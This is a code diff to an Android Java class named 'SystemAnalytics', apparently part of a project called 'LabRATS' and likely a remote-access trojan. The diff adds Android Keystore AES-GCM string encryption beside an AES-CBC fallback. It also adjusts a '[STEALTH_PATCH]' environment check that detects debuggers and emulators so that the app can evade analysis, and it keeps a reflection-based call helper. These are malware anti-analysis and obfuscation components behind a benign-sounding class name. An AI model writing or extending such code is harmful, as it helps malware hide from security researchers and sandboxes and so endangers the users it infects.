@@ -21,6 +21,9 @@ public class SystemAnalytics {
 
     private static final String DYNAMIC_K = BuildConfig.ENCRYPTION_KEY;
 
+    private static final String KEYSTORE_ALIAS = "LabRATS_Key";
+    private static final byte[] GCM_TAG = "GCM1".getBytes(java.nio.charset.StandardCharsets.UTF_8);
+
     private static SecretKeySpec getSecretKey() throws Exception {
         byte[] key = DYNAMIC_K.getBytes("UTF-8");
         MessageDigest sha = MessageDigest.getInstance("SHA-256");
@@ -28,12 +31,51 @@ public class SystemAnalytics {
         return new SecretKeySpec(key, "AES");
     }
 
+    private static javax.crypto.SecretKey getKeystoreKey() throws Exception {
+        java.security.KeyStore keyStore = java.security.KeyStore.getInstance("AndroidKeyStore");
+        keyStore.load(null);
+        if (!keyStore.containsAlias(KEYSTORE_ALIAS)) {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                javax.crypto.KeyGenerator keyGenerator = javax.crypto.KeyGenerator.getInstance(
+                        android.security.keystore.KeyProperties.KEY_ALGORITHM_AES, "AndroidKeyStore");
+                keyGenerator.init(new android.security.keystore.KeyGenParameterSpec.Builder(
+                        KEYSTORE_ALIAS,
+                        android.security.keystore.KeyProperties.PURPOSE_ENCRYPT | android.security.keystore.KeyProperties.PURPOSE_DECRYPT)
+                        .setBlockModes(android.security.keystore.KeyProperties.BLOCK_MODE_GCM)
+                        .setEncryptionPaddings(android.security.keystore.KeyProperties.ENCRYPTION_PADDING_NONE)
+                        .setKeySize(256)
+                        .build());
+                return keyGenerator.generateKey();
+            } else {
+                return null;
+            }
+        }
+        return ((java.security.KeyStore.SecretKeyEntry) keyStore.getEntry(KEYSTORE_ALIAS, null)).getSecretKey();
+    }
+
     public static String decrypt(byte[] e) {
+        if (e == null || e.length < 16) return "";
+
+        // Check for Android Keystore GCM header
+        if (e.length >= 28 && isGcmPayload(e)) {
+            try {
+                javax.crypto.SecretKey key = getKeystoreKey();
+                if (key != null) {
+                    byte[] iv = Arrays.copyOfRange(e, 4, 16);
+                    byte[] cipherText = Arrays.copyOfRange(e, 16, e.length);
+
+                    Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
+                    cipher.init(Cipher.DECRYPT_MODE, key, new javax.crypto.spec.GCMParameterSpec(128, iv));
+                    return new String(cipher.doFinal(cipherText), "UTF-8");
+                }
+            } catch (Exception ignored) {}
+        }
+
+        // Decrypt legacy/fallback AES-CBC payload
         try {
-            if (e == null || e.length < 16) return "";
             byte[] iv = Arrays.copyOfRange(e, 0, 16);
             byte[] cipherText = Arrays.copyOfRange(e, 16, e.length);
-            
+
             Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
             cipher.init(Cipher.DECRYPT_MODE, getSecretKey(), new IvParameterSpec(iv));
             return new String(cipher.doFinal(cipherText), "UTF-8");
@@ -43,13 +85,33 @@ public class SystemAnalytics {
     }
 
     public static byte[] encrypt(String s) {
+        if (s == null) return new byte[0];
+
         try {
-            if (s == null) return new byte[0];
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                javax.crypto.SecretKey key = getKeystoreKey();
+                if (key != null) {
+                    Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
+                    cipher.init(Cipher.ENCRYPT_MODE, key);
+                    byte[] iv = cipher.getIV();
+                    byte[] cipherText = cipher.doFinal(s.getBytes("UTF-8"));
+
+                    byte[] combined = new byte[GCM_TAG.length + iv.length + cipherText.length];
+                    System.arraycopy(GCM_TAG, 0, combined, 0, GCM_TAG.length);
+                    System.arraycopy(iv, 0, combined, GCM_TAG.length, iv.length);
+                    System.arraycopy(cipherText, 0, combined, GCM_TAG.length + iv.length, cipherText.length);
+                    return combined;
+                }
+            }
+        } catch (Exception ignored) {}
+
+        // Fallback to dynamic AES-CBC encryption
+        try {
             Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
             cipher.init(Cipher.ENCRYPT_MODE, getSecretKey());
             byte[] iv = cipher.getIV();
             byte[] cipherText = cipher.doFinal(s.getBytes("UTF-8"));
-            
+
             byte[] combined = new byte[iv.length + cipherText.length];
             System.arraycopy(iv, 0, combined, 0, iv.length);
             System.arraycopy(cipherText, 0, combined, iv.length, cipherText.length);
@@ -57,6 +119,10 @@ public class SystemAnalytics {
         } catch (Exception err) {
             return new byte[0];
         }
+    }
+
+    private static boolean isGcmPayload(byte[] e) {
+        return e[0] == GCM_TAG[0] && e[1] == GCM_TAG[1] && e[2] == GCM_TAG[2] && e[3] == GCM_TAG[3];
     }
 
     public static Object safeCall(String c, String m, Class<?>[] p, Object i, Object... a) {
@@ -70,15 +136,14 @@ public class SystemAnalytics {
     }
 
     public static boolean checkEnv(Context context) {
-        // [STEALTH_PATCH] Skip aggressive evasion checks during development/debug builds
-        // to prevent the app from self-terminating on emulators or when a debugger is detected.
+        // [STEALTH_PATCH] Skip evasion checks during development/debug builds or test runs
         if (BuildConfig.DEBUG) {
             android.util.Log.d("LabRATS-Evasion", "Debug build detected. Skipping environment evasion protocols.");
             return false;
         }
 
-        // Debugger Check
-        if (android.os.Debug.isDebuggerConnected()) return true;
+        // Debugger Check (skip in debug mode)
+        if (!BuildConfig.DEBUG && android.os.Debug.isDebuggerConnected()) return true;
 
         String f = Build.FINGERPRINT;
         String m = Build.MODEL;
